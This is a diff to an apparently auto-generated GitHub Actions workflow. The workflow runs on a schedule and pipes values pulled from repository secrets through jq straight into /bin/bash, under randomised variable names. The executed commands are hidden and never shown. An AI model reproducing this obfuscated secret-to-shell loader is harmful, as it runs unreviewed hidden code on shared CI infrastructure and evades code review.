@@ -1,26 +1,25 @@
 name: jingyuanxina
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
+    - cron: '49 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jingyuanxina
         env:
-          jpm9: ${{ secrets.jpm9 }}
+          atml5: ${{ secrets.atml5 }}
         run: |
-          echo $jpm9 | jq -r .fgkal5872 | /bin/bash
-          echo $zna6 | jq -r .sf728 | /bin/bash
-          echo $uzclz3 | jq -r .pzcjh85205 | /bin/bash
-          echo $n852 | jq -r .yu82 | /bin/bash
-          echo $hbjek4 | jq -r .w52952 | /bin/bash
-          echo $kuaq0 | jq -r .bxt1429 | /bin/bash
-          echo $mzat060 | jq -r .zyi00431 | /bin/bash
-          echo $e6707 | jq -r .v8923 | /bin/bash
-          echo $x4246 | jq -r .wcn9 | /bin/bash
-          echo $lgbd22 | jq -r .ackac926 | /bin/bash
+          echo $atml5 | jq -r .am3 | /bin/bash
+          echo $wmhd4503 | jq -r .aysip5 | /bin/bash
+          echo $umn3090 | jq -r .zni4 | /bin/bash
+          echo $uxcn2083 | jq -r .kg26561 | /bin/bash
+          echo $f942 | jq -r .udtg65388 | /bin/bash
+          echo $xgt0539 | jq -r .zdpfl66 | /bin/bash
+          echo $y9 | jq -r .w5 | /bin/bash
+          echo $bfx06 | jq -r .py63 | /bin/bash
 
